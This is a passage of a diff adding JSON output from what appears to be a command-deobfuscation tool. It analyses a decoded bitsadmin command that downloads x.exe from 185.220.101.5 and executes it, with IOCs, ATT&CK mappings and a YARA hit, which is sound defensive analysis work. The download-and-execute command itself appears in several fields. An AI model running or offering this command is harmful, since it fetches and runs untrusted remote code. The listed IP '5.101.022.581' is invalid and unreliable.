+        "preview": "# --- Bitsadmin File Transfer Detected ---\n# T1197 \u00b7 BITS Jobs \u00b7 T1105 \u00b7 Ingress Tool Transfer\n# Download URL: http://185.220.101.5/x.exe\ncmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe\n\n\u2500\u2500\u2500\u2500 NivXRay Native-Command Breakdown \u2500\u2500\u2500\u2500\nAction:        BITS-based File Transfer (LOLBAS)\nJob Name:      j\nSource URL:    ht",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "# --- Bitsadmin File Transfer Detected --- # T1197 \u00b7 BITS Jobs \u00b7 T1105 \u00b7 Ingress Tool Transfer # Download URL: http://185.220.101.5/x.exe cmd /c bitsadmin /",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "185.220.101.5/x.exe cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe \u2500\u2500\u2500\u2500 Niv",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1059.003",
+            "technique": "Windows Command Shell",
+            "tactic": "Execution"
+          },
+          {
+            "id": "T1197",
+            "technique": "BITS Jobs",
+            "tactic": "Defense Evasion"
+          },
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "Bitsadmin",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 37,
+          "band": "medium"
+        }
+      }
+    ],
+    "output_raw": "# --- Bitsadmin File Transfer Detected ---\n# T1197 \u00b7 BITS Jobs \u00b7 T1105 \u00b7 Ingress Tool Transfer\n# Download URL: http://185.220.101.5/x.exe\ncmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe\n\n\u2500\u2500\u2500\u2500 NivXRay Native-Command Breakdown \u2500\u2500\u2500\u2500\nAction:        BITS-based File Transfer (LOLBAS)\nJob Name:      j\nSource URL:    http://185.220.101.5/x.exe\nTarget File:   C:\\Users\\Public\\AppData\\Roaming\\a.exe\n\nMITRE ATT&CK:  T1197 / T1105\nRisk:          Windows-signed BITS job survives reboots; auto-retries download.\nNIVX Rule ID:  BITSADMIN_TRANSFER",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_BITSADMIN_TRANSFER+NATIVE_CMD_EXPLAINER \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 hex-decode \u2192 env-expand \u2192 bitsadmin-annotate \u2192 native-cmd-explain\n\n  MITRE ATT&CK\n    T1059.003    \u00b7 Execution\n    T1197        \u00b7 Defense Evasion\n    T1105        \u00b7 Command and Control\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       bitsadmin.exe, cmd.exe\n\n  IOCs\n    URL       http://185.220.101.5/x.exe\n    IP        185.220.101.5\n    IP        5.101.022.581\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
